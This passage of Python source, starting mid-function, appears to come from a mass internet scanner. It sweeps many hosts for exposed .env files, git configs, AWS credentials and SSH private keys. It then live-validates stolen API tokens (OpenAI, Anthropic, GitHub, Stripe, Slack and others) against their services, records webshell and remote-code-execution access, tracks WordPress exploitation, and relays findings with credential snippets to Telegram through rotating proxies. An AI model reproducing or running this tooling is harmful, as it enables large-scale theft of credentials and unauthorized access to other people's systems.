                                             if validated else 'Webshell indicators in response')),
                'shell_url':          full_url,
                'cmd_access':         full_url + '?cmd=whoami',
                'indicators':         ', '.join(indicators[:6]),
                'size_bytes':         len(content),
                'validated':          final_val,
                'upload_status':      (upload_info.get('note', 'NOT ATTEMPTED') if upload_info
                                       else 'NOT ATTEMPTED — RCE not confirmed'),
                'upload_content_url': up_url if up_url else 'N/A',
                'upload_exec':        'YES — PHP executing' if up_exec else 'NO',
                'rce_write':          (rce_write.get('rce_write', '') if rce_write else
                                       ('FAILED — could not write probe file'
                                        if validated else 'NOT ATTEMPTED')),
                'rce_probe_url':      rce_write.get('probe_url', '') if rce_write else '',
            }
            findings.append({'type': 'shell', 'url': base_url, 'path': path, 'data': supp_data})

    # ── Supplemental: generic API cred scan — attaches to exposure findings only,
    #    or creates a standalone api_keys finding if nothing else matched.
    #    Skip entirely if a typed credential handler already processed this content
    #    (db, mail, twilio, etc.) — those handlers already ran scan_for_api_creds
    #    on the same content and produced a richer structured finding.
    _already_typed = any(f.get('type') in _CRED_TYPES for f in findings)
    if status == 200 and len(content) > 20 and not _already_typed:
        api_creds = scan_for_api_creds(content)
        if api_creds:
            # Live-validate every high-value token type found by the regex scanner.
            # Each validator returns a dict with 'validation', 'validated', and
            # capability fields, or None if the key couldn't be tested.
            _live_validators = [
                ('OpenAI_Key',        validate_openai),
                ('Anthropic_Key',     validate_anthropic),
                ('GitHub_Token',      validate_github_token),
                ('GitHub_PAT',        validate_github_token),
                ('GitHub_App_Token',  validate_github_token),
                ('HuggingFace_Token', validate_huggingface),
                ('Stripe_SK',         validate_stripe),
                ('SendGrid',          validate_sendgrid),
                ('Slack_Token',       validate_slack),
                ('Google_API',        validate_google_api_key),
            ]
            any_live = False
            for cred_key, validator in _live_validators:
                raw = api_creds.get(cred_key)
                if not raw:
                    continue
                try:
                    v = validator(raw, timeout)
                except Exception:
                    v = None
                if v:
                    label = cred_key
                    api_creds[f'{label}_status'] = v.get('validation', '')
                    if v.get('validated') is True:
                        any_live = True
                        for k, val in v.items():
                            if k not in ('validation', 'validated'):
                                api_creds[f'{label}_{k}'] = str(val)
                    api_creds[f'{label}_validated'] = v.get('validated')

            if findings:
                for f in findings:
                    if (isinstance(f.get('data'), dict)
                            and 'exposed_creds' not in f['data']
                            and f['type'] not in _CRED_TYPES
                            and f.get('data', {}).get('validated') is not True):
                        f['data']['exposed_creds'] = str(api_creds)
                        break
            else:
                note = (f'LIVE API credentials at: {path}'
                        if any_live else f'API credentials found at: {path}')
                findings.append({
                    'type': 'api_keys', 'url': base_url, 'path': path,
                    'data': {'note': note, 'url': full_url,
                             'validated': True if any_live else None,
                             **api_creds},
                })

    return findings


# ── Path prioritization ───────────────────────────────────────────────────────

# Paths that are high-signal regardless of framework — always run first.
_PRIO_UNIVERSAL = frozenset({
    '/.env', '/public/.env', '/api/.env', '/backend/.env',
    '/.env.backup', '/.env.bak', '/.env.old', '/.env.production',
    '/.env.staging', '/.env.local', '/.env.secret',
    '/.git/HEAD', '/.git/config',
    '/.aws/credentials', '/.ssh/id_rsa', '/.ssh/id_ed25519',
    '/actuator/env', '/actuator/heapdump',
    '/terraform.tfstate', '/config/master.key',
    '/.docker/config.json', '/.netrc', '/.git-credentials',
})

# Framework-specific high-value paths — boosted when fingerprint matches.
_FW_BOOST = {
    'wordpress': frozenset({
        '/wp-login.php', '/wp-admin/', '/wp-config.php.bak', '/wp-config.php~',
        '/wp-config.txt', '/wp-json/wp/v2/users', '/xmlrpc.php',
        '/wp-content/debug.log', '/wp-content/uploads/',
    }),
    'laravel': frozenset({
        '/_ignition/health-check', '/_ignition/execute-solution',
        '/storage/logs/laravel.log', '/telescope', '/telescope/api/requests',
        '/horizon', '/horizon/api/stats', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/log-viewer', '/pulse', '/clockwork',
    }),
    'joomla': frozenset({
        '/administrator/', '/administrator/index.php',
        '/administrator/manifests/files/joomla.xml',
        '/api/index.php/v1/users', '/api/index.php/v1/config/application',
        '/configuration.php',
    }),
    'magento': frozenset({
        '/app/etc/local.xml', '/app/etc/env.php', '/app/etc/config.php',
        '/downloader/', '/var/log/exception.log',
    }),
    'spring': frozenset({
        '/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/mappings',
        '/actuator/beans', '/actuator/configprops',
        '/v2/api-docs', '/v3/api-docs', '/swagger-ui.html',
    }),
    'drupal': frozenset({
        '/core/install.php', '/CHANGELOG.txt',
        '/sites/default/settings.php.bak', '/user/login',
    }),
    'php': frozenset({
        '/phpinfo.php', '/info.php', '/adminer.php',
        '/phpmyadmin/', '/phpMyAdmin/', '/pma/',
    }),
}

# Keywords in path that indicate the path belongs to a specific framework
_FW_MARKERS = {
    'wordpress': ('wp-', 'wordpress'),
    'laravel':   ('laravel', 'telescope', 'horizon', 'clockwork', 'nova', 'pulse', 'ignition'),
    'joomla':    ('joomla', '/administrator'),
    'magento':   ('magento', 'downloader'),
    'spring':    ('actuator', 'jsessionid'),
    'drupal':    ('drupal', '/sites/default'),
    'php':       ('phpinfo', 'phpmyadmin', 'adminer'),
}


def _fingerprint_target(base_url: str, session, timeout: int) -> set:
    """
    One cheap GET to / — sniff headers and body for framework signals.
    Returns a set of technology strings: 'wordpress', 'laravel', 'php', etc.
    Never raises; returns empty set on any error.
    """
    signals = set()
    try:
        r = session.get(
            base_url.rstrip('/') + '/',
            timeout=_request_timeout(min(timeout, 4)),
            verify=False, allow_redirects=True,
        )
        hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
        body = r.text[:5000].lower()
        cx   = hdrs.get('set-cookie', '')
        srv  = hdrs.get('server', '')
        xpb  = hdrs.get('x-powered-by', '')

        if 'wp-content' in body or 'wp-json' in body or 'wordpress' in body:
            signals.add('wordpress')
        if 'laravel_session' in cx or 'xsrf-token' in cx or 'laravel' in body:
            signals.add('laravel')
        if 'joomla' in body or '/templates/system/' in body:
            signals.add('joomla')
        if 'mage.' in body or 'magento' in body or 'varien' in body:
            signals.add('magento')
        if 'jsessionid' in cx or 'x-application-context' in hdrs or 'spring' in body:
            signals.add('spring')
        if 'php' in xpb or '.php' in body:
            signals.add('php')
        if 'drupal' in body or '/sites/default/' in body or 'drupal' in hdrs.get('x-generator', ''):
            signals.add('drupal')
        if 'microsoft-iis' in srv or 'asp.net' in xpb:
            signals.add('iis')
    except Exception:
        pass
    return signals


def _prioritize_paths(paths: list, signals: set) -> list:
    """
    Reorder path list by estimated hit probability.
    Tier 0 — universal high-value paths (/.env, /.git/config, etc.)
    Tier 1 — framework paths boosted by fingerprint
    Tier 2 — generic exposure paths (no framework marker)
    Tier 3 — framework paths for frameworks NOT detected
    Returns a new sorted list; preserves all paths.
    """
    boosted: set = set()
    for sig in signals:
        boosted |= _FW_BOOST.get(sig, set())

    def _tier(p: str) -> int:
        if p in _PRIO_UNIVERSAL:
            return 0
        if p in boosted:
            return 1
        # check if path belongs to a framework not detected
        for fw, markers in _FW_MARKERS.items():
            if any(m in p.lower() for m in markers):
                return 3  # framework path but framework not in signals
        return 2           # generic exposure / CVE path

    return sorted(paths, key=_tier)


def _compute_canary(base_url, session, timeout) -> tuple[str | None, bool]:
    """
    Fetch two random nonexistent paths.
    Returns (canary_hash, waf_detected):
      canary_hash — MD5 of repeated body if catch-all detected, else None.
      waf_detected — True if WAF/CDN headers seen on either probe.
    """
    hashes = []
    waf_detected = False
    for _ in range(2):
        path = f"/{uuid.uuid4().hex[:14]}"
        r = _fetch(session, base_url + path, timeout)
        if r is None:
            return None, waf_detected
        if not waf_detected and _is_waf(dict(r.headers)):
            waf_detected = True
        if r.status_code != 200:
            return None, waf_detected
        hashes.append(hashlib.md5(r.content[:1024]).hexdigest())
    canary = hashes[0] if len(hashes) == 2 and hashes[0] == hashes[1] else None
    return canary, waf_detected


def check_path(base_url, path, session, timeout, pause_evt, stop_evt,
               log_cb=None, skip_waf=False, canary_hash=None, raw_log_cb=None) -> list[dict]:
    if stop_evt.is_set():
        return []
    pause_evt.wait()
    if stop_evt.is_set():
        return []
    r = _fetch(session, base_url + path, timeout)
    if r is None:
        return []

    # WAF/CDN skip: these hosts will never expose .env files — saves scan time
    if skip_waf and _is_waf(dict(r.headers)):
        if log_cb:
            log_cb(f"  ⛔ {base_url}  [WAF/CDN detected — skipping]")
        return []

    status  = r.status_code
    content = r.text[:80_000]

    # Soft-404 / catch-all skip: if this response matches the canary fingerprint
    # the server returns the same body for every URL — no real content here.
    if canary_hash and status == 200:
        if hashlib.md5(r.content[:1024]).hexdigest() == canary_hash:
            return []

    _SYM_ALL = {
        200: '→',  201: '→',  204: '→',
        301: '↪',  302: '↪',  307: '↪',  308: '↪',
        400: '?',  401: '!',  403: '!',  405: '?',  406: '?',  429: '⚡',
        500: '!!', 502: '!!', 503: '!!',
    }
    sym = _SYM_ALL.get(status, '?')

    # File log gets everything (skip only 404/410 which are true misses)
    if raw_log_cb and status not in (404, 410):
        raw_log_cb(f"  {sym} {path}  [{status}]")

    # GUI log: only actionable statuses to keep the panel readable
    _LOG_STATUSES = {200, 201, 204, 301, 302, 307, 308, 401, 500, 502, 503}
    if log_cb and status in _LOG_STATUSES:
        log_cb(f"  {sym} {path}  [{status}]")

    return _analyze(base_url, path, status, content, dict(r.headers), session, timeout)


# Credential-type findings deduplicate by stable credential content. This keeps
# duplicate leaks quiet without hiding different credentials found on the same host.
_CRED_TYPES = frozenset({
    'db', 'aws', 'stripe', 'mail', 'mailgun', 'sendgrid', 'postmark', 'brevo',
    'sparkpost', 'mandrill', 'mailjet', 'elasticemail', 'twilio', 'plivo', 'nexmo',
    'messagebird', 'sinch', 'telnyx', 'bandwidth', 'africas_talking', 'bulksms',
    'clicksend', 'telesign', 'clickatell', 'sms_api', 'api_keys',
    'shopify', 'binance', 'coinbase', 'paxful',
})

_DEDUP_META_KEYS = frozenset({
    'note', 'url', 'source_url', 'preview', 'size_bytes', 'indicators',
    'validation', 'validated', 'status', 'label', 'host', 'port', 'banner',
    'files', 'exec_confirmed', 'db_reachability', 'db_port_resolved',
})


def _credential_dedup_key(ftype: str, url: str, path: str, data) -> tuple:
    if ftype not in _CRED_TYPES:
        return (ftype, url, path)
    if not isinstance(data, dict):
        return (ftype, url, path, repr(data))
    material = tuple(
        sorted(
            (str(k), str(v))
            for k, v in data.items()
            if k not in _DEDUP_META_KEYS and v not in (None, '')
        )
    )
    return (ftype, url, material or path)




def _checkpoint_path():
    from saver import get_base_dir
    return _os.path.join(get_base_dir(), 'scan_checkpoint.json')


def _load_checkpoint() -> set:
    try:
        with open(_checkpoint_path(), encoding='utf-8') as f:
            return set(_json.load(f))
    except Exception:
        return set()


def _save_checkpoint(done: set):
    try:
        p   = _checkpoint_path()
        tmp = p + '.tmp'
        with _checkpoint_lock:
            with open(tmp, 'w', encoding='utf-8') as f:
                _json.dump(list(done), f)
            _os.replace(tmp, p)
    except Exception:
        pass


def _clear_checkpoint():
    try:
        p = _checkpoint_path()
        if _os.path.exists(p):
            _os.remove(p)
    except Exception:
        pass


class Scanner:
    def __init__(self, log_cb=None, progress_cb=None,
                 finding_cb=None, stats_cb=None, check_services=False,
                 telegram=None, proxies=None, skip_waf=False, resume=False,
                 redteam_email='', js_crawl=False, lfi_probe=False, active_checks=False,
                 file_log_cb=None):
        self.log_cb         = log_cb      or print
        self.progress_cb    = progress_cb or (lambda a, b: None)
        self.finding_cb     = finding_cb  or (lambda f: None)
        self.stats_cb       = stats_cb    or (lambda c, f: None)
        self._file_log_cb   = file_log_cb or (lambda m: None)
        self.check_services = check_services
        self._telegram      = telegram    # TelegramNotifier or None
        self._proxies       = list(proxies) if proxies else []
        self._proxy_idx     = 0
        self._skip_waf      = skip_waf
        self._resume        = resume
        self._js_crawl      = js_crawl
        self._lfi_probe     = lfi_probe
        self._active_checks = active_checks
        # Propagate red-team email to validator module for SMTP test sends
        set_redteam_email(redteam_email)

        self._stop  = threading.Event()
        self._pause = threading.Event()
        self._pause.set()

        self._lock       = threading.Lock()
        self._saved_keys: set = set()
        self.checked = 0
        self.found   = 0

    def _next_proxy(self) -> str | None:
        if not self._proxies:
            return None
        with self._lock:
            p = self._proxies[self._proxy_idx % len(self._proxies)]
            self._proxy_idx += 1
        return p

    def pause(self):  self._pause.clear()
    def resume(self): self._pause.set()

    def stop(self):
        self._pause.set()
        self._stop.set()

    @property
    def is_paused(self):  return not self._pause.is_set()
    @property
    def is_stopped(self): return self._stop.is_set()

    def _log(self, msg):
        self.log_cb(msg)
        self._file_log_cb(msg)

    def _handle(self, finding):
        ftype = finding['type']
        furl  = finding['url']
        fpath = finding['path']

        dedup_key = _credential_dedup_key(
            ftype, furl, fpath, finding.get('data')
        )
        with self._lock:
            if dedup_key in self._saved_keys:
                return
            self._saved_keys.add(dedup_key)
            self.found += 1

        save_finding(ftype, furl, fpath, finding['data'])

        d         = finding.get('data', {}) if isinstance(finding.get('data'), dict) else {}
        validated = d.get('validated')

        if self._telegram:
            import threading as _thr
            _thr.Thread(
                target=self._telegram.send_finding,
                args=(ftype, furl + fpath, d),
                daemon=True,
            ).start()

        if validated is True:
            marker = '  ✓ VALID'
        elif validated is False:
            marker = '  ✗ NOT ACCESSIBLE'
        elif validated is None:
            marker = '  ? ACCESSIBLE'
        else:
            marker = ''

        # Build short credential hint for the log line
        cred_hint = ''
        user = (d.get('username') or d.get('user') or
                d.get('MAIL_USERNAME') or d.get('SMTP_USERNAME'))
        pwd  = (d.get('password') or
                d.get('MAIL_PASSWORD') or d.get('SMTP_PASSWORD'))
        if user and pwd:
            cred_hint = f'  [{user} / {str(pwd)[:20]}]'
        elif user:
            cred_hint = f'  [{user}]'
        else:
            for k, v in d.items():
                if k in _NO_CRED_KEYS or not isinstance(v, str) or len(v) < 8:
                    continue
                ku = k.upper()
                if any(t in ku for t in ('KEY', 'TOKEN', 'SECRET', 'SID', 'AUTH')):
                    cred_hint = f'  [{k[:16]}={v[:18]}…]'
                    break

        prefix = '[+]' if validated is True else ('[?]' if validated is None else '[-]')
        log_line = (
            f"  {prefix} [{finding['type'].upper()}] "
            f"{finding['url']}{finding['path']}{marker}{cred_hint}"
        )
        self._log(log_line)
        self.finding_cb(finding)

    def scan_target(self, base_url, paths, threads, timeout):
        base_url = normalize_url(base_url)
        paths = list(dict.fromkeys(paths))   # deduplicate, preserve order
        self._log(f"[*] {base_url}  ({len(paths)} paths)")

        proxy = self._next_proxy()
        session = make_session(proxy=proxy)
        worker_local = threading.local()
        worker_sessions = []
        worker_sessions_lock = threading.Lock()

        def _worker_session():
            sess = getattr(worker_local, 'session', None)
            if sess is None:
                sess = make_session(proxy=proxy)
                worker_local.session = sess
                with worker_sessions_lock:
                    worker_sessions.append(sess)
            return sess

        def _check_worker_path(path):
            return check_path(
                base_url, path, _worker_session(),
                timeout, self._pause, self._stop, self._log,
                self._skip_waf, canary_hash,
                raw_log_cb=self._file_log_cb,
            )

        try:
            # ── Soft-404 / catch-all fingerprint + per-target WAF check ──
            canary_hash, waf_hit = _compute_canary(base_url, session, timeout)
            if canary_hash:
                self._log(f"  [!] {base_url} — catch-all detected, soft-404 filter active")
            if self._skip_waf and waf_hit:
                self._log(f"  ⛔ {base_url}  [WAF/CDN detected — skipping all paths]")
                return

            # ── Technology fingerprint → reorder paths by hit probability ─
            signals = _fingerprint_target(base_url, session, timeout)
            if signals:
                self._log(f"  [~] {base_url} — detected: {', '.join(sorted(signals))}")
            paths = _prioritize_paths(list(paths), signals)

            # ── Service detection (FTP/SSH/cPanel/WHM) ───────────────────
            if self.check_services and not self._stop.is_set():
                try:
                    for f in scan_services(base_url, session, timeout):
                        self._handle(f)
                except Exception:
                    pass

            # ── Path scanning ─────────────────────────────────────────────
            _live_paths: set = set()   # 200-status paths — fed to active_checks
            with ThreadPoolExecutor(max_workers=threads) as pool:
                futures = {
                    pool.submit(_check_worker_path, p): p
                    for p in paths
                }
                for fut in as_completed(futures):
                    if self._stop.is_set():
                        pool.shutdown(wait=False, cancel_futures=True)
                        return
                    p = futures[fut]
                    try:
                        results = fut.result() or []
                        for f in results:
                            self._handle(f)
                        if results:
                            _live_paths.add(p)
                    except Exception:
                        pass
                    with self._lock:
                        self.checked += 1
                        _checked_snap = self.checked
                        _found_snap   = self.found
                    if _checked_snap % 50 == 0 or _checked_snap == 1:
                        self.stats_cb(_checked_snap, _found_snap)
                    # Heartbeat every 500 checks so log panel shows life even on all-403 targets
                    if _checked_snap % 500 == 0:
                        self._log(f"  ▸ {_checked_snap:,} checked · {_found_snap} found")

            # ── Deep JS crawl (runs after all paths, before worker teardown) ──
            if self._js_crawl and not self._stop.is_set():
                try:
                    for f in crawl_js(base_url, session, timeout, self._log):
                        self._handle(f)
                except Exception:
                    pass

            # ── LFI / Path Traversal param probe ─────────────────────────────
            if self._lfi_probe and not self._stop.is_set():
                try:
                    for f in probe_lfi(base_url, session, timeout, self._log):
                        self._handle(f)
                except Exception:
                    pass

            # ── Active misconfiguration probes (CORS, Host-inject, redirect, verb, XFF)
            if self._active_checks and not self._stop.is_set():
                try:
                    for f in run_active_checks(base_url, session, timeout, _live_paths, self._log):
                        self._handle(f)
                except Exception:
                    pass

        finally:
            for worker_session in worker_sessions:
                try:
                    worker_session.close()
                except Exception:
                    pass
            session.close()

    def scan_queue(self, ip_queue, paths, threads, timeout, fetch_done_evt):
        """
        Streaming scan: read targets from a queue as they arrive.
        Returns when the queue is empty AND fetch_done_evt is set (fetch finished).
        fetch_done_evt: threading.Event — set by the producer when it's done.
        """
        import queue as _q
        with _wp_exploit_lock:
            _wp_exploited.clear()

        scanned = 0
        scan_lock = threading.Lock()
        target_workers = _target_worker_count(10_000, threads)
        self._log(f"[*] Stream target workers: {target_workers} parallel target(s)")

        _sq_probes = []
        if self._js_crawl:      _sq_probes.append('js_crawl')
        if self._lfi_probe:     _sq_probes.append('lfi_probe')
        if self._active_checks: _sq_probes.append('active_checks')
        if self.check_services: _sq_probes.append('service_checks')
        _mf_path = start_manifest(RESULTS_DIR, {
            'source':        'stream',
            'target_count':  'live',
            'path_count':    len(paths),
            'threads':       threads,
            'timeout':       timeout,
            'target_workers': target_workers,
            'skip_waf':      self._skip_waf,
            'active_probes': _sq_probes,
        })

        def _stream_worker():
            nonlocal scanned
            while not self._stop.is_set():
                try:
                    target = ip_queue.get(timeout=0.5)
                except _q.Empty:
                    if fetch_done_evt.is_set() and ip_queue.empty():
                        break
                    continue
                try:
                    self.scan_target(target, paths, threads, timeout)
                    with scan_lock:
                        scanned += 1
                        cur = scanned
                        total_now = max(cur, ip_queue.qsize() + cur)
                    self.progress_cb(cur, total_now)
                except ValueError as exc:
                    self._log(f"[!] Skipping invalid target {target!r}: {exc}")
                except Exception as exc:
                    self._log(f"[!] Target failed {target!r}: {exc}")
                finally:
                    ip_queue.task_done()

        with ThreadPoolExecutor(max_workers=target_workers) as pool:
            futures = [pool.submit(_stream_worker) for _ in range(target_workers)]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        finish_manifest(_mf_path, self.found, stopped=self._stop.is_set())
        self._log(f"\n[*] Stream scan finished — {self.found} finding(s) across {scanned} target(s).")
        self._log(f"[*] Results saved to: {RESULTS_DIR}")

    def scan_all(self, targets, paths, threads, timeout):
        # Reset per-scan global tracking sets so re-runs work cleanly
        with _wp_exploit_lock:
            _wp_exploited.clear()

        targets, invalid_targets = parse_targets(targets)
        for raw, reason in invalid_targets:
            self._log(f"[!] Skipping invalid target {raw!r}: {reason}")
        paths = [p for p in dict.fromkeys(paths) if isinstance(p, str) and p.startswith('/')]
        threads = max(1, min(100, int(threads)))
        timeout = max(1, min(120, int(timeout)))
        if not targets:
            self._log("[!] No valid targets to scan.")
            self.progress_cb(0, 0)
            return
        if not paths:
            self._log("[!] No valid probe paths to scan.")
            self.progress_cb(0, len(targets))
            return

        # Checkpoint / resume support
        done_set: set = set()
        if self._resume:
            done_set = _load_checkpoint()
            if done_set:
                self._log(f"[*] Resume mode — skipping {len(done_set)} already-scanned target(s)")
            targets = [t for t in targets if normalize_url(t) not in done_set]

        total = len(targets)
        target_workers = _target_worker_count(total, threads)
        self._log(
            f"[*] {total} target(s) · {len(paths)} path(s) · "
            f"{threads} path threads · {target_workers} target workers · {timeout}s timeout"
        )
        if self._proxies:
            self._log(f"[*] Proxy pool: {len(self._proxies)} proxies (round-robin)")
        if self._skip_waf:
            self._log("[*] WAF/CDN skip enabled — Cloudflare/CDN hosts will be bypassed")

        # Write run manifest so each session is documented
        _active_probes = []
        if self._js_crawl:      _active_probes.append('js_crawl')
        if self._lfi_probe:     _active_probes.append('lfi_probe')
        if self._active_checks: _active_probes.append('active_checks')
        if self.check_services: _active_probes.append('service_checks')
        _mf_path = start_manifest(RESULTS_DIR, {
            'source':        'manual',
            'target_count':  total,
            'path_count':    len(paths),
            'threads':       threads,
            'timeout':       timeout,
            'target_workers': target_workers,
            'skip_waf':      self._skip_waf,
            'resume':        self._resume,
            'proxies':       len(self._proxies),
            'active_probes': _active_probes,
        })

        completed = 0

        def _scan_one(target):
            if self._stop.is_set():
                return normalize_url(target), False
            self.scan_target(target, paths, threads, timeout)
            return normalize_url(target), True

        pool = ThreadPoolExecutor(max_workers=target_workers)
        stopped = False
        try:
            futures = {pool.submit(_scan_one, target): target for target in targets}
            for fut in as_completed(futures):
                if self._stop.is_set():
                    stopped = True
                    self._log("[!] Scan stopped.")
                    pool.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    norm_target, finished = fut.result()
                except Exception:
                    norm_target, finished = normalize_url(futures[fut]), False
                if finished:
                    done_set.add(norm_target)
                    if self._resume:
                        _save_checkpoint(done_set)
                completed += 1
                self.progress_cb(completed, total)
        finally:
            if not stopped:
                pool.shutdown(wait=True)
            elif self._resume:
                _save_checkpoint(done_set)

        if not self._stop.is_set() and self._resume:
            _clear_checkpoint()

        finish_manifest(_mf_path, self.found, stopped=stopped)
        self._log(f"\n[*] Finished — {self.found} finding(s) across {total} target(s).")
        self._log(f"[*] Results saved to: {RESULTS_DIR}")
